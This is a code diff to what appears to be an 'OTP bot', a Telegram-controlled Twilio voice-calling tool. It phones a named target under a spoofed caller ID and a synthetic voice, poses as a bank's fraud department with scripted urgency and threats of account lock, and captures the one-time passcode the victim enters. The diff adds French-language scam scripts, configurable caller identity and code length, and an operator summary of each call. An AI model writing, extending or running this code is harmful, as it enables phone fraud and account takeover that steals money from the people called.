@@ -2552,10 +2552,33 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
+                from_name = read_user_file(user_id_str, "From Name.txt", "").strip()
+                language = (read_user_file(user_id_str, "Language.txt", "en") or "en").upper()
+                delivery = (read_user_file(user_id_str, "Delivery.txt", "sms") or "sms").upper()
                 voice_id = read_user_file(user_id_str, "Voice.txt", DEFAULT_VOICE_ID)
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                 emotion = read_user_file(user_id_str, "emotion.txt", "neutral").strip()
-                
+                voice_name = read_user_file(user_id_str, "VoiceName.txt", "") or ""
+                if not voice_name:
+                    voice_key = get_voice_key_by_id(voice_id)
+                    if voice_key:
+                        voice_name = VOICE_MAPPING.get(voice_key, {}).get("name", "")
+
+                setup_summary = (
+                    f"📋 Call settings:\n"
+                    f"• Target: {name}\n"
+                    f"• Company: {company}\n"
+                    f"• Caller identity: {from_name or company}\n"
+                    f"• Number: {phonenum}\n"
+                    f"• Caller ID: {caller_id}\n"
+                    f"• Voice: {voice_name or voice_id}\n"
+                    f"• Language: {language}\n"
+                    f"• Delivery: {delivery}\n"
+                    f"• OTP length: {code_length}\n"
+                    f"• Mode: {mode_label}\n"
+                )
+                bot.send_message(chat_id, f"✨ Starting Normal Call with current setup:\n\n{setup_summary}")
+
                 webhook_url = (
                     f"{NGROK_URL.rstrip('/')}/focus_listen_flow"
                     f"?user_id={quote_plus(str(user_id_str))}"
@@ -3610,6 +3633,59 @@ def capture_otp():
     after_gather = request.values.get("after_gather") == "1"
     chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
     voice_id, voice_name = get_call_voice_info(call_sid, user_id)
+    name = read_user_file(user_id, "Name.txt", "Customer")
+    company = read_user_file(user_id, "Company Name.txt", "your bank")
+    from_name = read_user_file(user_id, "From Name.txt", "").strip()
+    language = (read_user_file(user_id, "Language.txt", "en") or "en").lower()
+    delivery = (read_user_file(user_id, "Delivery.txt", "sms") or "sms").lower()
+    code_length = read_user_file(user_id, "Digits.txt", "6")
+    try:
+        code_length = int(code_length)
+    except (TypeError, ValueError):
+        code_length = 6
+    if code_length < 4 or code_length > 10:
+        code_length = 6
+
+    if from_name:
+        caller_identity = f"{from_name} from {company}"
+    else:
+        caller_identity = f"{company}"
+
+    if language == "fr":
+        if delivery == "email":
+            delivery_text = "courriel"
+        else:
+            delivery_text = "SMS"
+        confirm_prompt = (
+            f"Bonjour. Ceci est {caller_identity}. "
+            f"Puis-je parler à {name} ? Nous avons détecté une activité suspecte sur votre compte, "
+            f"et devons vérifier votre identité immédiatement pour protéger vos fonds. "
+            f"Un code à {code_length} chiffres a été envoyé par {delivery_text}. "
+            "Veuillez appuyer sur 1 maintenant pour confirmer que vous êtes le titulaire du compte et poursuivre la vérification."
+        )
+        otp_prompt = (
+            f"Merci. Un code à {code_length} chiffres a été envoyé par {delivery_text}. "
+            "Veuillez entrer le code suivi de la touche dièse (#)."
+        )
+        retry_text = "Veuillez appuyer sur 1 pour continuer le processus de vérification."
+        no_response_text = "Désolé, je n'ai pas entendu de réponse. Ceci est une vérification obligatoire."
+        timeout_text = "Aucune entrée n'a été reçue. Merci. Au revoir."
+    else:
+        delivery_text = "email" if delivery == "email" else "SMS"
+        confirm_prompt = (
+            f"Good day. This is {caller_identity}. "
+            f"May I speak with {name}? We have detected a suspicious login attempt on your account, "
+            f"and need to verify your identity immediately to protect your funds. "
+            f"A {delivery_text} one-time passcode has been sent for {code_length}-digit verification. "
+            "Please press 1 now to confirm you are the account holder and wish to proceed with verification."
+        )
+        otp_prompt = (
+            f"Thank you. We have sent a {code_length}-digit one-time passcode via {delivery_text}. "
+            "Please enter the code followed by the pound key (#)."
+        )
+        retry_text = "Please press 1 to continue the verification process."
+        no_response_text = "I'm sorry, I didn't hear a response. This is a mandatory verification."
+        timeout_text = "No input was received. Goodbye."
 
     if call_sid and call_sid in call_sessions:
         session = call_sessions[call_sid]
@@ -3646,9 +3722,7 @@ def capture_otp():
                     resp.say(final)
                 resp.hangup()
                 return Response(str(resp), content_type="application/xml")
-            fallback = (
-                "I'm sorry, I didn't hear a response. This is a mandatory verification. Please press 1 to avoid account lock."
-            )
+            fallback = f"{no_response_text} Please press 1 to avoid account lock."
             resp = VoiceResponse()
             audio_fallback = generate_call_audio(user_id=user_id, text=fallback, voice_id=voice_id, filename="normal_ultimate_fallback.mp3")
             if audio_fallback:
@@ -3668,7 +3742,7 @@ def capture_otp():
                 method="POST",
                 finish_on_key="",
             )
-            reprompt = "Please press 1 to continue the verification process."
+            reprompt = retry_text
             audio_reprompt = generate_call_audio(user_id=user_id, text=reprompt, voice_id=voice_id, filename="normal_ultimate_press1_retry.mp3")
             if audio_reprompt:
                 gather.play(audio_reprompt)
@@ -3677,12 +3751,7 @@ def capture_otp():
             resp.append(gather)
             return Response(str(resp), content_type="application/xml")
         # Initial confirm1 prompt with a bank-style greeting and urgency script.
-        prompt = (
-            f"Good day. This is {company} Fraud Prevention Department. "
-            f"May I speak with {name}? We have detected a suspicious login attempt on your account, "
-            "and need to verify your identity immediately to protect your funds. "
-            "Please press 1 now to confirm you are the account holder and wish to proceed with verification."
-        )
+        prompt = confirm_prompt
         resp = VoiceResponse()
         gather_action = (
             f"/capture_otp?user_id={quote_plus(str(user_id))}"
@@ -3706,10 +3775,7 @@ def capture_otp():
 
     if stage == "otp":
         if not after_gather:
-            prompt = (
-                "Thank you. We have sent a one-time passcode to your device. "
-                "Please enter the code followed by the pound key (#)." 
-            )
+            prompt = otp_prompt
             resp = VoiceResponse()
             audio_prompt = generate_call_audio(user_id=user_id, text=prompt, voice_id=voice_id, filename="normal_ultimate_otp_request.mp3")
             if audio_prompt:
@@ -3721,7 +3787,7 @@ def capture_otp():
                 f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp&after_gather=1"
             )
             gather = Gather(
-                num_digits=6,
+                num_digits=code_length,
                 action=gather_action,
                 timeout=15,
                 input="dtmf",
